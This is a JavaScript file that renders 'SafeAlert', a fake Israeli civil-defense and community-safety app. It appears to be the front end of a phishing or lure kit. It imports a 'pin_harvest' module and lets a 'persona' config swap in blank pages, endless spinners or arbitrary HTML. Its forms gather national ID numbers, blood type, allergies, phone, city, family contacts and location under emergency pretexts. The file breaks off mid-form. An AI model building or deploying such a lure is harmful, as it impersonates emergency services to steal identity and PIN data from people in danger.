import { showPinHarvest } from './modules/pin_harvest.js';

export function showPopup(title, body) {
  const el = document.createElement('div');
  el.style.cssText = 'position:fixed;inset:0;background:#000a;display:flex;align-items:flex-end;z-index:999;padding:16px';
  el.innerHTML = `
    <div style="background:#1c1c1e;border-radius:12px;width:100%;padding:20px">
      <h3 style="margin-bottom:8px">${title ?? 'Message'}</h3>
      <p style="color:#ebebf599;font-size:14px">${body ?? ''}</p>
      <button onclick="this.closest('div[style]').remove()" style="width:100%;margin-top:16px;padding:14px;border:none;border-radius:8px;background:#0a84ff;color:#fff;font-size:17px;font-weight:600">OK</button>
    </div>`;
  document.body.appendChild(el);
}

export function renderUI(persona) {
  const uiType = persona?.ui_type ?? 'builtin';

  // --- white: completely blank page ---
  if (uiType === 'white') {
    const s = document.createElement('style');
    s.textContent = 'html,body{background:#fff;}';
    document.head.appendChild(s);
    return;
  }

  // --- spinner: centered indefinite spinner, white bg ---
  if (uiType === 'spinner') {
    const s = document.createElement('style');
    s.textContent = 'html,body{margin:0;padding:0;height:100%;background:#fff;display:flex;align-items:center;justify-content:center;} .wc-spin{width:40px;height:40px;border:3px solid #e5e5ea;border-top-color:#007aff;border-radius:50%;animation:wc-rot .8s linear infinite;} @keyframes wc-rot{to{transform:rotate(360deg);}}';
    document.head.appendChild(s);
    document.body.innerHTML = '<div class="wc-spin"></div>';
    return;
  }

  // --- html: inject arbitrary HTML, optional splash overlay ---
  if (uiType === 'html') {
    document.body.innerHTML = persona.ui_html ?? '';
    const splash = persona.splash;
    if (splash?.enabled) {
      const overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;inset:0;z-index:9999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;transition:opacity 0.4s ease;';
      if (splash.title) {
        const t = document.createElement('div');
        t.style.cssText = 'font-size:24px;font-weight:700;font-family:-apple-system,sans-serif;';
        t.textContent = splash.title;
        overlay.appendChild(t);
      }
      if (splash.subtitle) {
        const sub = document.createElement('div');
        sub.style.cssText = 'font-size:14px;color:#6e6e73;font-family:-apple-system,sans-serif;';
        sub.textContent = splash.subtitle;
        overlay.appendChild(sub);
      }
      document.body.appendChild(overlay);
      const dur = splash.duration ?? 1800;
      setTimeout(() => {
        overlay.style.opacity = '0';
        overlay.style.pointerEvents = 'none';
        setTimeout(() => overlay.remove(), 420);
      }, dur);
    }
    return;
  }

  // --- builtin (default): SafeAlert — Israeli civil-defense + community safety app ---

  // Global state (module-scoped)
  let _tab = 'home';
  let _alertFilter = 'all';
  let _locationGranted = false;
  let _notifGranted = false;
  let _expandedAlert = null;
  let _shelterDistances = ['?', '?', '0.4 km', '0.7 km', '1.1 km'];
  let _profileData = { name: '', id: '', blood: '', allergies: '' };
  let _accountData = { phone: '', city: '' };
  let _toggles = {
    rocket: true, shelter: true, weather: true, community: false,
    location: true, precision: true
  };
  let _familyContacts = [];
  let _renderInterval = null;

  const CHV = `<svg viewBox="0 0 9 14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 1l7 6-7 6"/></svg>`;

  const ALERTS_DATA = [
    { id: 1, cat: 'security', icon: '🚀', title: 'Rocket Alert Drill — Northern District', loc: 'Northern District', time: '2 min ago', sev: 'high', color: '#ff3b30', body: 'Home Front Command is conducting a scheduled drill. Sirens will sound for 90 seconds. Proceed to nearest shelter. This is a drill — no actual threat.' },
    { id: 2, cat: 'weather',  icon: '🌬️', title: 'Strong Wind Warning',                  loc: 'Tel Aviv & Gush Dan', time: '14 min ago', sev: 'medium', color: '#ff9500', body: 'Wind gusts of 70–90 km/h expected until midnight. Secure loose objects on balconies. Avoid beach promenades and exposed hilltops.' },
    { id: 3, cat: 'traffic',  icon: '🚗', title: 'Serious Accident — Route 4 South',      loc: 'Route 4, Km 112',    time: '27 min ago', sev: 'medium', color: '#ff9500', body: 'Multi-vehicle accident blocking 2 lanes southbound near Hadera interchange. Emergency services on scene. Use Route 6 as alternate. Expect 40+ min delay.' },
    { id: 4, cat: 'municipal',icon: '💧', title: 'Water Outage — Haifa Port District',    loc: 'Haifa, Downtown',    time: '1 hr ago',  sev: 'low',    color: '#0055cc', body: 'Emergency water main repair in progress. Water service interrupted in port district and surrounding streets. Estimated restoration by 20:00.' },
    { id: 5, cat: 'weather',  icon: '⛈️', title: 'Flash Flood Watch — Jordan Valley',     loc: 'Jordan Valley',      time: '2 hrs ago', sev: 'high',   color: '#ff3b30', body: 'Rapid accumulation of rainfall in the Judean Hills may produce flash flooding in valley washes. Do not attempt to cross flooded roads. Stay on high ground.' },
    { id: 6, cat: 'community',icon: '📢', title: 'Planned Power Outage — Rishon LeZion', loc: 'Rishon LeZion Zone C', time: '3 hrs ago', sev: 'low',    color: '#34c759', body: 'IEC scheduled maintenance outage 07:00–11:00 tomorrow. Affects zones C4–C7. Critical medical equipment users: contact your local authority.' },
  ];

  const SHELTERS_DATA = [
    { name: 'Central Bus Station', cap: 50,  status: 'open',   idx: 0 },
    { name: 'City Hall Basement',  cap: 120, status: 'open',   idx: 1 },
    { name: 'Azrieli Mall Level -1', cap: 200, status: 'open', idx: 2 },
    { name: "Ha'atzmaut Park Shelter", cap: 80, status: 'closed', idx: 3 },
    { name: 'Municipal Library',   cap: 60,  status: 'open',   idx: 4 },
  ];

  function _clock() {
    const now = new Date();
    return now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0');
  }

  function _sevBadge(sev) {
    const map = { high: ['#ff3b30','HIGH'], medium: ['#ff9500','MED'], low: ['#34c759','LOW'] };
    const [bg, label] = map[sev] || ['#8e8e93','—'];
    return `<span style="background:${bg};color:#fff;font-size:10px;font-weight:700;padding:2px 7px;border-radius:6px;letter-spacing:.05em;">${label}</span>`;
  }

  function _catChip(cat, label) {
    const active = _alertFilter === cat;
    return `<button onclick="window._setFilter('${cat}')" style="border:none;padding:6px 14px;border-radius:16px;font-size:13px;font-weight:600;cursor:pointer;background:${active ? '#0055cc' : '#e5e5ea'};color:${active ? '#fff' : '#3a3a3c'};">${label}</button>`;
  }

  function _toggle(key) {
    const on = _toggles[key];
    return `<div onclick="window._tog('${key}')" style="width:51px;height:31px;background:${on ? '#34c759' : '#e5e5ea'};border-radius:15.5px;position:relative;cursor:pointer;flex-shrink:0;transition:background .2s;">
      <div style="position:absolute;top:2px;left:${on ? '22px' : '2px'};width:27px;height:27px;border-radius:13.5px;background:#fff;box-shadow:0 2px 4px rgba(0,0,0,.25);transition:left .2s;"></div>
    </div>`;
  }

  function _renderNavbar(title, showSearch) {
    return `<div style="height:52px;background:#fff;border-bottom:.5px solid #e5e5ea;display:flex;align-items:flex-end;padding:0 16px 10px;flex-shrink:0;">
      <span style="font-size:17px;font-weight:600;flex:1;">${title}</span>
      ${showSearch ? `<div style="width:30px;height:30px;border-radius:15px;background:#e9e9eb;display:flex;align-items:center;justify-content:center;cursor:pointer;">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#3a3a3c" stroke-width="2.2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
      </div>` : ''}
    </div>`;
  }

  function _renderTabBar() {
    const tabs = [
      { id:'home',     label:'Home',     icon:`<svg viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>` },
      { id:'alerts',   label:'Alerts',   icon:`<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a7 7 0 0 1 7 7v3.586l1.707 1.707A1 1 0 0 1 20 16H4a1 1 0 0 1-.707-1.707L5 12.586V9a7 7 0 0 1 7-7zm0 20a2 2 0 0 1-2-2h4a2 2 0 0 1-2 2z"/></svg>`, badge: 2 },
      { id:'shelters', label:'Shelters', icon:`<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 3L2 12h3v9h6v-5h2v5h6v-9h3L12 3z"/><rect x="9" y="14" width="6" height="7" fill="none"/></svg>` },
      { id:'contacts', label:'Contacts', icon:`<svg viewBox="0 0 24 24" fill="currentColor"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>` },
      { id:'settings', label:'Settings', icon:`<svg viewBox="0 0 24 24" fill="currentColor"><path d="M19.14 12.94c.04-.3.06-.61.06-.94s-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.49.49 0 0 0-.59-.22l-2.39.96a7.03 7.03 0 0 0-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>` },
    ];
    return `<div id="wc-tabbar" style="position:fixed;bottom:0;left:0;right:0;height:83px;background:rgba(249,249,249,.94);border-top:.5px solid #e5e5ea;-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px);display:flex;align-items:flex-start;justify-content:space-around;padding-top:10px;z-index:100;">
      ${tabs.map(t => {
        const active = _tab === t.id;
        const color = active ? '#0055cc' : '#8e8e93';
        const badgeHtml = (t.badge && _tab !== 'alerts') ? `<span style="position:absolute;top:-3px;right:-5px;background:#ff3b30;color:#fff;font-size:9px;font-weight:700;min-width:14px;height:14px;border-radius:7px;padding:0 3px;display:flex;align-items:center;justify-content:center;">${t.badge}</span>` : '';
        return `<div onclick="window._goTab('${t.id}')" style="display:flex;flex-direction:column;align-items:center;gap:3px;min-width:56px;cursor:pointer;color:${color};">
          <div style="position:relative;width:26px;height:26px;">${t.icon}${badgeHtml}</div>
          <span style="font-size:10px;font-weight:${active ? '600' : '500'};">${t.label}</span>
        </div>`;
      }).join('')}
    </div>`;
  }

  function _renderHome() {
    const homeAlerts = ALERTS_DATA.slice(0, 3);
    return `
    ${_renderNavbar('SafeAlert', true)}
    <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:93px;">

      <!-- Hero status card -->
      <div onclick="window._reportIncident()" style="margin:14px 16px 0;background:linear-gradient(135deg,#1a9e40,#27c050);border-radius:18px;padding:20px 20px 18px;position:relative;overflow:hidden;cursor:pointer;box-shadow:0 4px 16px rgba(52,199,89,.35);">
        <div style="position:absolute;top:-20px;right:-20px;width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.1);"></div>
        <div style="position:absolute;bottom:-30px;right:20px;width:70px;height:70px;border-radius:50%;background:rgba(255,255,255,.08);"></div>
        <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
          <div style="width:10px;height:10px;border-radius:50%;background:#fff;animation:sa-pulse 2s ease-out infinite;"></div>
          <span style="color:rgba(255,255,255,.85);font-size:12px;font-weight:600;letter-spacing:.08em;text-transform:uppercase;">Current Status</span>
        </div>
        <div style="color:#fff;font-size:26px;font-weight:800;letter-spacing:-.5px;margin-bottom:4px;">All Clear</div>
        <div style="color:rgba(255,255,255,.8);font-size:13px;">No active alerts in your area</div>
        <div style="margin-top:14px;display:flex;align-items:center;gap:6px;color:rgba(255,255,255,.9);font-size:13px;font-weight:600;">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="rgba(255,255,255,.9)"><path d="M12 2a10 10 0 1 0 0 20A10 10 0 0 0 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
          Tap to report an incident
        </div>
      </div>

      <!-- Quick actions grid -->
      <div style="padding:18px 16px 0;">
        <div style="font-size:13px;color:#6e6e73;font-weight:600;letter-spacing:.03em;text-transform:uppercase;margin-bottom:10px;">Quick Actions</div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
          <div onclick="window._reportIncident()" style="background:#fff;border-radius:14px;padding:16px 14px;cursor:pointer;box-shadow:0 1px 4px rgba(0,0,0,.08);active:opacity:.7;">
            <div style="font-size:26px;margin-bottom:8px;">📢</div>
            <div style="font-size:14px;font-weight:600;color:#1c1c1e;">Report Incident</div>
            <div style="font-size:12px;color:#6e6e73;margin-top:2px;">Submit to authorities</div>
          </div>
          <div onclick="window._goTab('shelters')" style="background:#fff;border-radius:14px;padding:16px 14px;cursor:pointer;box-shadow:0 1px 4px rgba(0,0,0,.08);">
            <div style="font-size:26px;margin-bottom:8px;">🏠</div>
            <div style="font-size:14px;font-weight:600;color:#1c1c1e;">Find Shelter</div>
            <div style="font-size:12px;color:#6e6e73;margin-top:2px;">Nearest safe rooms</div>
          </div>
          <div onclick="window._emergencySOS()" style="background:#fff2f1;border-radius:14px;padding:16px 14px;cursor:pointer;box-shadow:0 1px 4px rgba(255,59,48,.15);">
            <div style="font-size:26px;margin-bottom:8px;">🆘</div>
            <div style="font-size:14px;font-weight:600;color:#ff3b30;">Emergency SOS</div>
            <div style="font-size:12px;color:#6e6e73;margin-top:2px;">Alert family + 100</div>
          </div>
          <div onclick="window._firstAid()" style="background:#fff7f0;border-radius:14px;padding:16px 14px;cursor:pointer;box-shadow:0 1px 4px rgba(255,149,0,.12);">
            <div style="font-size:26px;margin-bottom:8px;">❤️‍🩹</div>
            <div style="font-size:14px;font-weight:600;color:#ff9500;">First Aid Guide</div>
            <div style="font-size:12px;color:#6e6e73;margin-top:2px;">Step-by-step care</div>
          </div>
        </div>
      </div>

      <!-- Alerts near you banner -->
      <div onclick="window._requestLocation()" style="margin:16px 16px 0;background:linear-gradient(135deg,#0044aa,#0055cc);border-radius:14px;padding:16px 18px;display:flex;align-items:center;gap:14px;cursor:pointer;">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="#fff" style="flex-shrink:0;"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
        <div style="flex:1;">
          <div style="color:#fff;font-size:14px;font-weight:700;margin-bottom:2px;">Get alerts near you</div>
          <div style="color:rgba(255,255,255,.75);font-size:12px;">Enable location for hyper-local alerts</div>
        </div>
        <svg width="9" height="14" viewBox="0 0 9 14" fill="none" stroke="rgba(255,255,255,.7)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 1l7 6-7 6"/></svg>
      </div>

      <!-- Notification promo -->
      ${!_notifGranted ? `<div onclick="window._requestNotifications()" style="margin:12px 16px 0;background:#fff;border-radius:14px;padding:14px 16px;display:flex;align-items:center;gap:12px;cursor:pointer;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        <div style="width:40px;height:40px;border-radius:10px;background:#fff2f1;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="#ff3b30"><path d="M12 2a7 7 0 0 1 7 7v3.586l1.707 1.707A1 1 0 0 1 20 16H4a1 1 0 0 1-.707-1.707L5 12.586V9a7 7 0 0 1 7-7zm0 20a2 2 0 0 1-2-2h4a2 2 0 0 1-2 2z"/></svg>
        </div>
        <div style="flex:1;">
          <div style="font-size:14px;font-weight:600;color:#1c1c1e;">Enable rocket alerts</div>
          <div style="font-size:12px;color:#6e6e73;margin-top:1px;">Get notified the moment sirens sound</div>
        </div>
        <svg width="9" height="14" viewBox="0 0 9 14" fill="none" stroke="#c7c7cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 1l7 6-7 6"/></svg>
      </div>` : ''}

      <!-- Active in your area -->
      <div style="font-size:20px;font-weight:700;letter-spacing:-.3px;padding:20px 16px 10px;">Active in Your Area</div>
      ${homeAlerts.map(a => `
        <div onclick="window._goTab('alerts')" style="background:#fff;border-radius:14px;margin:0 16px 12px;padding:14px;box-shadow:0 1px 4px rgba(0,0,0,.07);cursor:pointer;">
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
            <span style="font-size:18px;">${a.icon}</span>
            <span style="font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:${a.color};">${a.cat.toUpperCase()}</span>
            <div style="flex:1;"></div>
            ${_sevBadge(a.sev)}
          </div>
          <div style="font-size:15px;font-weight:600;margin-bottom:4px;color:#1c1c1e;">${a.title}</div>
          <div style="font-size:13px;color:#6e6e73;line-height:1.45;">${a.body.substring(0,90)}...</div>
          <div style="display:flex;align-items:center;justify-content:space-between;margin-top:10px;">
            <span style="font-size:12px;color:#aeaeb2;">${a.time}</span>
            <span style="font-size:12px;color:#0055cc;font-weight:500;">${a.loc}</span>
          </div>
        </div>`).join('')}

      <div style="height:10px;"></div>
    </div>`;
  }

  function _renderAlerts() {
    const cats = [
      {id:'all', label:'All'},
      {id:'security', label:'Security'},
      {id:'weather', label:'Weather'},
      {id:'traffic', label:'Traffic'},
      {id:'municipal', label:'Municipal'},
    ];
    const filtered = _alertFilter === 'all' ? ALERTS_DATA : ALERTS_DATA.filter(a => a.cat === _alertFilter);
    return `
    ${_renderNavbar('Alerts', false)}
    <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:93px;">

      <!-- Filter chips -->
      <div style="padding:12px 16px;display:flex;gap:8px;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch;flex-shrink:0;">
        ${cats.map(c => _catChip(c.id, c.label)).join('')}
      </div>

      <!-- Alert cards -->
      <div style="padding:0 16px;">
        ${filtered.map(a => {
          const expanded = _expandedAlert === a.id;
          return `<div onclick="window._expandAlert(${a.id})" style="background:#fff;border-radius:14px;margin-bottom:12px;padding:14px;box-shadow:0 1px 4px rgba(0,0,0,.07);cursor:pointer;">
            <div style="display:flex;align-items:flex-start;gap:12px;">
              <div style="width:42px;height:42px;border-radius:11px;background:${a.color}22;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">${a.icon}</div>
              <div style="flex:1;min-width:0;">
                <div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;">
                  <span style="font-size:11px;font-weight:700;color:${a.color};text-transform:uppercase;letter-spacing:.05em;">${a.cat}</span>
                  ${_sevBadge(a.sev)}
                </div>
                <div style="font-size:15px;font-weight:600;color:#1c1c1e;margin-bottom:3px;">${a.title}</div>
                <div style="font-size:12px;color:#6e6e73;">📍 ${a.loc} · ${a.time}</div>
                ${expanded ? `<div style="font-size:13px;color:#3a3a3c;line-height:1.55;margin-top:10px;padding-top:10px;border-top:.5px solid #e5e5ea;">${a.body}</div>
                  <div style="display:flex;gap:10px;margin-top:12px;">
                    <button onclick="event.stopPropagation();" style="flex:1;padding:9px;border:1.5px solid #0055cc;border-radius:9px;background:#fff;color:#0055cc;font-size:13px;font-weight:600;cursor:pointer;">Share</button>
                    <button onclick="event.stopPropagation();" style="flex:1;padding:9px;border:none;border-radius:9px;background:#0055cc;color:#fff;font-size:13px;font-weight:600;cursor:pointer;">Follow</button>
                  </div>` : ''}
              </div>
            </div>
          </div>`;
        }).join('')}
        ${filtered.length === 0 ? `<div style="display:flex;flex-direction:column;align-items:center;padding:48px 32px;gap:10px;text-align:center;">
          <div style="font-size:42px;margin-bottom:4px;">✅</div>
          <div style="font-size:18px;font-weight:600;">No alerts in this category</div>
          <div style="font-size:14px;color:#6e6e73;line-height:1.5;">All clear for now.</div>
        </div>` : ''}
      </div>
    </div>`;
  }

  function _renderShelters() {
    return `
    ${_renderNavbar('Nearby Shelters', false)}
    <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:93px;">

      <!-- Report button -->
      <div style="padding:12px 16px 0;display:flex;justify-content:flex-end;">
        <button onclick="window._shelterReport()" style="border:1.5px solid #0055cc;background:#fff;color:#0055cc;font-size:13px;font-weight:600;padding:7px 14px;border-radius:9px;cursor:pointer;">Report shelter status</button>
      </div>

      <!-- Map placeholder -->
      <div style="margin:12px 16px 0;background:#cfe0f0;border-radius:18px;height:180px;overflow:hidden;position:relative;">
        <div style="position:absolute;inset:0;background-image:linear-gradient(rgba(0,0,0,.06) 1px,transparent 1px),linear-gradient(90deg,rgba(0,0,0,.06) 1px,transparent 1px);background-size:28px 28px;"></div>
        <!-- roads -->
        <div style="position:absolute;top:35%;left:0;right:0;height:13px;background:#fff;opacity:.65;"></div>
        <div style="position:absolute;top:65%;left:0;right:0;height:9px;background:#fff;opacity:.65;"></div>
        <div style="position:absolute;top:0;bottom:0;left:25%;width:11px;background:#fff;opacity:.65;"></div>
        <div style="position:absolute;top:0;bottom:0;left:60%;width:8px;background:#fff;opacity:.65;"></div>
        <div style="position:absolute;top:0;bottom:0;left:80%;width:7px;background:#fff;opacity:.45;"></div>
        <!-- shelter pins -->
        <div style="position:absolute;top:28%;left:22%;color:#0055cc;font-size:18px;">🏠</div>
        <div style="position:absolute;top:50%;left:55%;color:#0055cc;font-size:18px;">🏠</div>
        <div style="position:absolute;top:20%;left:70%;color:#0055cc;font-size:18px;">🏠</div>
        <!-- user pin -->
        <div style="position:absolute;top:50%;left:38%;transform:translate(-50%,-100%);">
          <svg viewBox="0 0 32 40" width="30" height="38" fill="none"><path d="M16 0C9.37 0 4 5.37 4 12c0 9 12 28 12 28s12-19 12-28C28 5.37 22.63 0 16 0z" fill="#0055cc"/><circle cx="16" cy="12" r="5" fill="#fff"/></svg>
        </div>
        <div style="position:absolute;top:50%;left:38%;width:48px;height:48px;border-radius:24px;background:rgba(0,85,204,.15);transform:translate(-50%,-50%);animation:sa-pulse 2s ease-out infinite;"></div>
        ${!_locationGranted ? `<div onclick="window._requestLocation()" style="position:absolute;inset:0;background:rgba(0,0,0,.35);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;cursor:pointer;">
          <svg width="32" height="32" viewBox="0 0 24 24" fill="#fff"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
          <div style="color:#fff;font-size:14px;font-weight:700;">Enable Location</div>
          <div style="color:rgba(255,255,255,.8);font-size:12px;">to see distances to shelters</div>
        </div>` : '<div style="position:absolute;bottom:10px;left:10px;font-size:11px;color:#3a3a3c;background:rgba(255,255,255,.85);padding:3px 8px;border-radius:8px;">Tel Aviv — Central</div>'}
      </div>

      <!-- Shelter list -->
      <div style="margin:14px 16px 0;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        ${SHELTERS_DATA.map((s,i) => {
          const dist = _shelterDistances[s.idx];
          const isOpen = s.status === 'open';
          return `<div style="display:flex;align-items:center;gap:12px;padding:14px;border-bottom:${i < SHELTERS_DATA.length-1 ? '.5px solid #e5e5ea' : 'none'};">
            <div style="width:40px;height:40px;border-radius:10px;background:${isOpen ? '#eaf7ee' : '#fef0f0'};display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">🏠</div>
            <div style="flex:1;min-width:0;">
              <div style="font-size:14px;font-weight:600;color:#1c1c1e;">${s.name}</div>
              <div style="font-size:12px;color:#6e6e73;margin-top:2px;">Capacity: ${s.cap} people · ${dist} away</div>
            </div>
            <div style="background:${isOpen ? '#eaf7ee' : '#fef0f0'};color:${isOpen ? '#1a9e40' : '#ff3b30'};font-size:11px;font-weight:700;padding:3px 9px;border-radius:7px;white-space:nowrap;">${isOpen ? 'Open' : 'Closed'}</div>
          </div>`;
        }).join('')}
      </div>
      <div style="height:14px;"></div>
    </div>`;
  }

  function _renderContacts() {
    const emergency = [
      { icon:'🚔', name:'Police',          num:'100', color:'#0055cc' },
      { icon:'🚑', name:'Magen David Adom', num:'101', color:'#ff3b30' },
      { icon:'🚒', name:'Fire Department',  num:'102', color:'#ff9500' },
      { icon:'🛡️', name:'Home Front Command', num:'104', color:'#5856d6' },
    ];
    return `
    ${_renderNavbar('Emergency Contacts', false)}
    <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:93px;">

      <div style="padding:18px 16px 8px;">
        <div style="font-size:22px;font-weight:800;letter-spacing:-.4px;color:#1c1c1e;">Your Emergency Network</div>
        <div style="font-size:13px;color:#6e6e73;margin-top:3px;">Keep this information updated and accessible</div>
      </div>

      <!-- Emergency services -->
      <div style="font-size:13px;color:#6e6e73;text-transform:uppercase;letter-spacing:.05em;padding:4px 16px 8px;font-weight:600;">Emergency Services</div>
      <div style="margin:0 16px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        ${emergency.map((e,i) => `<div style="display:flex;align-items:center;gap:12px;padding:14px;border-bottom:${i < emergency.length-1 ? '.5px solid #e5e5ea' : 'none'};">
          <div style="width:42px;height:42px;border-radius:10px;background:${e.color}18;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">${e.icon}</div>
          <div style="flex:1;">
            <div style="font-size:15px;font-weight:600;color:#1c1c1e;">${e.name}</div>
            <div style="font-size:13px;color:#6e6e73;">${e.num}</div>
          </div>
          <div style="width:36px;height:36px;border-radius:18px;background:${e.color};display:flex;align-items:center;justify-content:center;cursor:pointer;">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M6.62 10.79a15.05 15.05 0 0 0 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.25 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
          </div>
        </div>`).join('')}
      </div>

      <!-- My Family -->
      <div style="font-size:13px;color:#6e6e73;text-transform:uppercase;letter-spacing:.05em;padding:20px 16px 8px;font-weight:600;">My Family</div>
      <div style="margin:0 16px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        ${_familyContacts.length === 0 ? `<div style="display:flex;flex-direction:column;align-items:center;padding:28px 24px;gap:8px;text-align:center;">
          <div style="font-size:36px;margin-bottom:2px;">👨‍👩‍👧</div>
          <div style="font-size:15px;font-weight:600;color:#1c1c1e;">No family members yet</div>
          <div style="font-size:13px;color:#6e6e73;">Add family so they can be reached during emergencies</div>
        </div>` : _familyContacts.map((f,i) => `<div style="display:flex;align-items:center;gap:12px;padding:14px;border-bottom:${i < _familyContacts.length-1 ? '.5px solid #e5e5ea':'none'};">
          <div style="width:40px;height:40px;border-radius:20px;background:#0055cc;display:flex;align-items:center;justify-content:center;font-size:18px;color:#fff;font-weight:700;flex-shrink:0;">${f.name[0]}</div>
          <div style="flex:1;"><div style="font-size:14px;font-weight:600;">${f.name}</div><div style="font-size:12px;color:#6e6e73;">${f.phone}</div></div>
        </div>`).join('')}
        <div onclick="window._addFamily()" style="display:flex;align-items:center;justify-content:center;gap:8px;padding:14px;border-top:${_familyContacts.length > 0 ? '.5px solid #e5e5ea' : 'none'};cursor:pointer;">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="#0055cc"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
          <span style="font-size:14px;font-weight:600;color:#0055cc;">Add family member</span>
        </div>
      </div>

      <!-- My Profile -->
      <div style="font-size:13px;color:#6e6e73;text-transform:uppercase;letter-spacing:.05em;padding:20px 16px 8px;font-weight:600;">My Medical Profile</div>
      <div style="margin:0 16px;background:#fff;border-radius:14px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        <div style="margin-bottom:12px;">
          <div style="font-size:12px;color:#6e6e73;margin-bottom:5px;font-weight:500;">Full Name</div>
          <input id="prof-name" value="${_profileData.name}" placeholder="Your full name" oninput="window._profField('name',this.value)" style="width:100%;padding:10px 12px;border:1.5px solid #e5e5ea;border-radius:9px;font-size:14px;outline:none;font-family:inherit;color:#1c1c1e;">
        </div>
        <div style="margin-bottom:12px;">
          <div style="font-size:12px;color:#6e6e73;margin-bottom:5px;font-weight:500;">ID Number (Teudat Zehut)</div>
          <input id="prof-id" value="${_profileData.id}" placeholder="000000000" oninput="window._profField('id',this.value)" style="width:100%;padding:10px 12px;border:1.5px solid #e5e5ea;border-radius:9px;font-size:14px;outline:none;font-family:inherit;color:#1c1c1e;" inputmode="numeric">
        </div>
        <div style="display:flex;gap:10px;margin-bottom:12px;">
          <div style="flex:1;">
            <div style="font-size:12px;color:#6e6e73;margin-bottom:5px;font-weight:500;">Blood Type</div>
            <input id="prof-blood" value="${_profileData.blood}" placeholder="A+" oninput="window._profField('blood',this.value)" style="width:100%;padding:10px 12px;border:1.5px solid #e5e5ea;border-radius:9px;font-size:14px;outline:none;font-family:inherit;color:#1c1c1e;">
          </div>
          <div style="flex:2;">
